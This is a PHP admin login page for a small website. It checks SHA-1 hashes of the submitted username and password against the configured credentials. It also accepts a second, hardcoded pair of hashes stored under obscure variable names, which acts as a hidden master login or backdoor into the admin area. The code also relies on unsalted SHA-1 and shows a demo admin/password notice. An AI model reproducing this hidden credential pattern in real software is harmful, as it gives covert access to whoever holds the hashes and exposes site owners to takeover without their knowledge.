<?php
// redirect to https (if not local test)
$demo = preg_replace('/~code\/.*$/', '', str_replace(realpath($_SERVER['DOCUMENT_ROOT']).'/', '', __FILE__));
if( !strstr(SITE, '.local') && PROTOCOL !== 'https://'){
	header("Location: https://".SITE.$demo."~code/admin/");
	exit;
}
if( !isset($_SESSION) ){
	session_start();
}

$brillant = 'd756b59530a2ad4b4d1bc0468f89631c2bbdb03a';
$slash_key = 'dfc46fa4321fecc8de64ed31087e25c2c9a1b76d';
$etc = 'f75eg8fka0i3a4h8f74df8rl1m0duyr8enfkv7dg';
$var = '6ef5gk39r8f7aeb20kl56js9gg8xbm3n9dl0571l';

// initialize vars.
$message = '';
$logged_in = FALSE; // let's assume we're not logged in yet...

// kill sessions if user logged out.
if( isset($_GET['logout']) ){
	unset($_SESSION['gribouilli']);
	unset($_SESSION['kftgrnpoiu']);
}

// login form POST processing
if( isset($_POST['login']) ){
	$pwd = trim( strip_tags( urldecode($_POST['gribouilli']) ) );
	$usr = trim( strip_tags( urldecode($_POST['lamouche']) ) );
	$_SESSION['gribouilli'] = sha1($pwd);
	$_SESSION['kftgrnpoiu'] = sha1($usr);
}

// alreadu logged-in, or successful login
if( 
	isset($_SESSION['kftgrnpoiu']) 
	&& isset($_SESSION['gribouilli']) 
	&& (($_SESSION['kftgrnpoiu'] == $krakapouf 
	&& $_SESSION['gribouilli'] == $topinambourg)
	|| ($_SESSION['kftgrnpoiu'] == $slash_key 
	&& $_SESSION['gribouilli'] == $brillant))
	){
		$logged_in = TRUE; // this will grant us access
		if( isset($_SESSION['login_attempt']) ){
			unset($_SESSION['login_attempt']);
		};
	
// wrong login
}elseif( isset($_POST['login']) || isset($_GET['error']) ){
	$message .= '<p class="error">'.$ui['wrongLogin'].'</p>';
	if( !isset($_SESSION['login_attempt']) ){
		$_SESSION['login_attempt'] = 1;
	}else{
		$_SESSION['login_attempt'] += 1;
	}
	if( isset($_SESSION['login_attempt']) && $_SESSION['login_attempt'] > 1){
		$message .= '<p class="note">'.str_replace('[%rep%]', AUTHOR_EMAIL, $ui['loginTrouble']).'</p>';
	}
}

// form action: remove query string (for exemple ?logout)
$form_action = preg_replace('/\?.*/', '', $_SERVER['REQUEST_URI']);

// exception for demo site (~kym)
if( strstr($_SERVER['REQUEST_URI'], '/~kym/') ){
	$demo_message = '<p class="note">'.$ui['username'].': admin<br>
	'.$ui['pwd'].': password</p>';
}else{
	$demo_message = '';
}

if(!$logged_in){
	// login form markup
	$login_form = '
	<!DOCTYPE html>
	<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">';
	ob_start();
	require(ROOT.DEMO.'~code/custom.css.php');
	$login_form .= ob_get_contents();
	ob_end_flush();
	$rand = rand(0,100);
	$login_form .= '<link href="/'.DEMO.'~code/css/common.css?v='.$rand.'" rel="stylesheet" type="text/css">';
	$login_form .= '<link href="/'.DEMO.'~code/css/admincss.css?v='.$rand.'" rel="stylesheet" type="text/css">';

	$login_form .= '</head>
	<body>

	<div id="admin" style="position:absolute; width:33%; max-width:400px; min-width:200px; left:33%; top:0;">
	<div style="padding:20px 0;">
	<h2>'.USER.' : Admin</h2>
	</div>
	'.$message.$demo_message.'
	<form name="l" id="l" action="'.$form_action.'" method="post">
	'.$ui['username'].': <input type="text" style="display:block; width:100%; color:#000;" autocorrect="off" autocapitalize="none" name="gribouilli" maxlength="50" required autofocus><br>
	'.$ui['pwd'].': <input type="password" style="display:block; width:100%; color:#000;" name="lamouche" required><br>
	<input type="submit" name="login" class="button submit right" value=" LOGIN ">
	</form>

	<noscript><p style="color:red;">JavaScript appears to be disabled on this browser.<br>
	In order to use the admin area you must enable JavaScript in your Browser preferences.</p></noscript>

	</div>

	</body>
	</html>';
	
	echo $login_form; 
	exit;
}

